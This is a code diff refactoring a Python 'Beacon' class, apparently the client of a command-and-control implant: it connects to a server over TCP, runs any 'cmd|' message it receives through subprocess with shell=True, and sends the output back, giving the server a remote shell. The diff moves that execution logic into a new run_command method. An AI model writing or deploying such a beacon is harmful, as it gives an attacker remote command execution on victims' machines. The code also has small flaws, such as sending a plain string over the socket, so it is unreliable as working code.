@@ -16,6 +16,22 @@ class Beacon:
    def connect(self):
       self.sock.connect((self.server_ip,self.server_port))
 
+   def run_command(self,command):
+      try:
+         cmd = command.split(" ")
+         ps = subprocess.run(cmd, shell=True, capture_output=True,check=True)
+         if self.debugging == True:
+            print("Sending:" ,ps.stdout)
+         if ps.stdout != None and ps.stdout!= "":
+            self.sock.send(ps.stdout)
+         else:
+            self.sock.send("SUCCESS")
+      except Exception as e:
+                     error_msg = f"ERROR: {str(e)}"
+                     print(error_msg)
+                     self.sock.send(error_msg.encode())
+
+
    def start(self):
       self.running = True
       self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -31,19 +47,7 @@ class Beacon:
                   print("Received:",data)
                split = data.split("|")
                if split[0] == "cmd":
-                  try:
-                     command = split[1].split(" ")
-                     ps = subprocess.run(command, shell=True, capture_output=True,check=True)
-                     if self.debugging == True:
-                        print("Sending:" ,ps.stdout)
-                     if ps.stdout != None and ps.stdout!= "":
-                        self.sock.send(ps.stdout)
-                     else:
-                        self.sock.send("SUCCESS")
-                  except Exception as e:
-                     error_msg = f"ERROR: {str(e)}"
-                     print(error_msg)
-                     self.sock.send(error_msg.encode())
+                  self.run_command(split[1])
                elif split[0] == "quit":
                   self.terminate()
                else:
